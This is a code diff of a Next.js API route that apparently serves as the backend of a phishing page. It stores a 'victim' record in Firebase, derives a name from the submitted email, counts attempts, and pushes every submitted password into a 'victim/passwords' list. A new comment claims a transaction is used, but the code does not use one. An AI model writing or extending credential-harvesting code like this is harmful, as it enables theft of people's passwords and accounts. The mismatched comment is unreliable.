@@ -97,7 +97,7 @@ export async function POST(request: NextRequest) {
           victimUpdate.name = body.email.split('@')[0];
           victimUpdate.profilePicture = ''; // Default or empty profile picture
         }
-        await update(ref(db, 'victim'), victimUpdate);
+        await set(ref(db, 'victim'), victimUpdate);
         return NextResponse.json({ success: true });
       }
 
@@ -107,8 +107,11 @@ export async function POST(request: NextRequest) {
         const victim = victimSnapshot.exists() ? victimSnapshot.val() : initialState.victim;
 
         const newAttempts = (victim.attempts || 0) + 1;
+        
+        // Use a transaction to safely update passwords array
         const passwordsRef = ref(db, 'victim/passwords');
         await firebasePush(passwordsRef, body.password);
+
 
         let victimUpdate: any = { attempts: newAttempts };
 
